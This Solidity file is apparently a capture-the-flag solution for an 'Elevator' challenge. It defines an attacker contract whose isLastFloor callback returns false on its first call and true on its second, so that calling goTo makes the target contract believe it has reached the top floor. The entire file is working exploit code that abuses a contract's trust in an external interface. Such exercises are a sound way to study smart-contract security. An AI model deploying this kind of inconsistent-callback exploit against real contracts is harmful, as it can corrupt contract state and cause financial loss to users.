// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

import "./Elevator.sol";

contract Attack is Building {
    uint256 poison;
    Elevator elevator;

    constructor(address _to) public {
        poison = 0;
        elevator = Elevator(_to);
    }

    function isLastFloor(uint256) external override returns (bool) {
        bool result = (poison % 2 != 0);
        poison += 1;
        return result;
    }

    function attack() external {
        elevator.goTo(0);
    }
}
